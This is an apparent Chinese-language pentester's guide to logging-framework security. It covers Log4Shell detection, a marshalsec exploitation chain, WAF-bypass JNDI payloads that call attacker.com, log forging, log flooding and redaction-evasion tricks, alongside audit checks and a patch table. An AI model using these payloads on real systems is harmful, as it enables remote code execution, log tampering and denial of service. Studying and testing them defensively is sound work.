# 日志框架安全测试 (Logging Framework Security Testing)

---

## 第一部分：文档概述

### 1.1 编写目的
本文档旨在为渗透测试人员提供应用程序日志框架的安全测试方法论，帮助测试人员评估 Log4j、Logback、SLF4J 等日志框架的安全性。

### 1.2 适用范围
本文档适用于以下场景：
- Log4j/Log4j2 安全测试
- Logback 安全测试
- SLF4J 安全评估
- 日志注入漏洞测试
- Log4Shell 类漏洞检测

### 1.3 读者对象
- 渗透测试工程师
- 应用安全分析师
- Java 开发人员
- 安全架构师

---

## 第二部分：核心渗透技术专题

### 2.1 技术介绍

日志框架是应用程序记录日志的核心组件。日志框架安全测试关注框架漏洞（如 Log4Shell）、日志注入、配置错误和敏感信息泄露等问题。

**核心原理：**
- **JNDI 注入（Log4Shell）**：Log4j2 在特定配置下可触发 JNDI 查找导致 RCE
- **日志注入**：用户输入未过滤直接记录可导致日志伪造
- **配置错误**：日志级别、输出目标配置不当
- **敏感信息记录**：日志中包含密码、令牌等敏感数据

### 2.2 攻击常见于哪些业务场景

| **业务场景** | **功能示例** | **风险点描述** |
| :--- | :--- | :--- |
| **用户输入记录** | 登录、搜索、表单 | 日志注入攻击 |
| **异常处理** | 错误页面、API 响应 | 堆栈跟踪泄露 |
| **调试接口** | 调试日志端点 | 敏感信息泄露 |
| **HTTP 头记录** | User-Agent、Referer | 头部注入攻击 |
| **数据库操作** | SQL 日志记录 | SQL 语句泄露 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**Log4Shell 探测：**
```bash
# 检测 Log4j2 漏洞 (CVE-2021-44228)
# 在各种输入点注入 JNDI payload

# HTTP 头注入
curl -H "User-Agent: \${jndi:ldap://attacker.com/a}" http://target/
curl -H "X-Forwarded-For: \${jndi:ldap://attacker.com/a}" http://target/
curl -H "Referer: \${jndi:ldap://attacker.com/a}" http://target/

# 参数注入
curl "http://target/search?q=\${jndi:ldap://attacker.com/a}"
curl -X POST "http://target/login" -d "username=\${jndi:ldap://attacker.com/a}"

# 使用 DNSLog 检测
curl "http://target?name=\${jndi:dns://your-dnslog.com}"
```

**日志注入探测：**
```bash
# 测试换行符注入
curl "http://target/search?q=test%0a2024-01-01%20INFO%20Fake%20Entry"

# 测试特殊字符
curl "http://target/search?q=test%0d%0a"
curl "http://target/search?q=test%00"  # 空字节

# 检查响应中是否回显日志内容
curl "http://target/api/debug?input=UNIQUE_MARKER_12345"
```

**版本指纹识别：**
```bash
# 检测 Log4j 版本
# 通过错误消息或响应头
curl http://target/ 2>&1 | grep -i log4j

# 检查依赖文件
curl http://target/WEB-INF/lib/ | grep -i log4j
```

#### 2.3.2 白盒测试

**依赖审计：**
```xml
<!-- Maven pom.xml 检查 -->
<!-- 危险版本 -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.14.1</version>  <!-- 危险：存在 Log4Shell -->
</dependency>

<!-- 安全版本 -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.17.1</version>  <!-- 安全 -->
</dependency>
```

**配置审计：**
```xml
<!-- log4j2.xml 危险配置 -->
<Configuration>
    <Appenders>
        <!-- 危险：输出到 Web 目录 -->
        <File fileName="/var/www/html/logs/app.log" name="File">
            <PatternLayout pattern="%d %p %c - %m%n"/>
        </File>
        
        <!-- 危险：JDBC Appender 配置不当 -->
        <JDBC name="Database" tableName="logs">
            <ConnectionFactory class="com.app.DbFactory" method="get"/>
        </JDBC>
    </Appenders>
</Configuration>
```

**代码审计：**
```java
// 危险模式：直接记录用户输入
logger.info("User search: " + userInput);

// 危险模式：记录敏感数据
logger.info("Login: user=" + username + ", pass=" + password);

// 危险模式：记录完整请求
logger.debug("Request: " + request.toString());

// 正确模式：脱敏记录
logger.info("User search: {}", sanitize(userInput));
```

### 2.4 漏洞利用方法

#### 2.4.1 Log4Shell 利用

```bash
# 完整利用链
# 1. 设置 LDAP 服务器
# 使用 marshalsec 工具
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker.com/#Exploit"

# 2. 发送 payload
curl -H "User-Agent: \${jndi:ldap://attacker.com:1389/a}" http://target/

# 3. 或使用 DNS 外带检测
curl "http://target?x=\${jndi:dns://attacker.com}"
```

**变体 Payload：**
```bash
# 绕过简单过滤
${${lower:j}${lower:n}di:ldap://attacker.com/a}
${${env:BAR:-j}ndi:ldap://attacker.com/a}
${jndi:ldap://${host:hostname}.attacker.com/a}

# 其他协议
${jndi:rmi://attacker.com/a}
${jndi:corba://attacker.com/a}
${jndi:iiop://attacker.com/a}
```

#### 2.4.2 日志注入攻击

```bash
# 伪造日志条目
curl "http://target/api?msg=%0a2024-01-01%2012:00:00%20INFO%20Admin%20logged%20in%20from%20127.0.0.1"

# 注入虚假成功记录
# 使调查人员难以确定真实攻击时间线

# 日志洪水
for i in {1..10000}; do
    curl "http://target/api?msg=Noise_$i"
done
```

#### 2.4.3 敏感信息提取

```bash
# 触发错误获取堆栈跟踪
curl "http://target/api?param="
curl "http://target/api?param=' OR '1'='1"

# 错误响应可能包含：
# - 框架版本
# - 文件路径
# - SQL 语句
# - 配置信息
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过 WAF 过滤

```bash
# 如果 WAF 过滤 ${jndi:
# 使用嵌套表达式
${${jndi:ldap://attacker.com}}

# 使用环境变量
${env:TEST:-jndi:ldap://attacker.com}

# 使用系统属性
${sys:file.separator}ndi:ldap://attacker.com

# 编码绕过
${j${lower:n}di:ldap://attacker.com}
```

#### 2.5.2 绕过日志脱敏

```bash
# 如果系统脱敏特定字段
# 尝试变体字段名

# 原始（被脱敏）
password=secret123

# 绕过
pass_word=secret123
passwd=secret123
pwd=secret123
```

---

## 第三部分：附录

### 3.1 日志框架安全配置检查清单

| **框架** | **配置项** | **安全设置** |
| :--- | :--- | :--- |
| Log4j2 | 版本 | 2.17.1+ |
| Log4j2 | formatMsgNoLookups | true |
| Logback | 配置文件的权限 | 640 |
| SLF4J | 绑定 | 正确绑定到实现 |
| 所有框架 | 日志级别 | 生产环境 INFO+ |

### 3.2 Log4j2 安全版本参考

| **版本范围** | **风险** | **建议** |
| :--- | :--- | :--- |
| 2.0-beta9 - 2.14.1 | Log4Shell (CVE-2021-44228) | 升级到 2.17.1+ |
| 2.15.0 | 部分绕过 (CVE-2021-45046) | 升级到 2.17.1+ |
| 2.16.0 | DoS (CVE-2021-45105) | 升级到 2.17.1+ |
| 2.17.0+ | 安全 | 推荐使用 |

### 3.3 参考资源

- [Log4j Security Advisory](https://logging.apache.org/log4j/2.x/security.html)
- [CWE-117: Improper Output Neutralization for Logs](https://cwe.mitre.org/data/definitions/117.html)
- [OWASP Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)
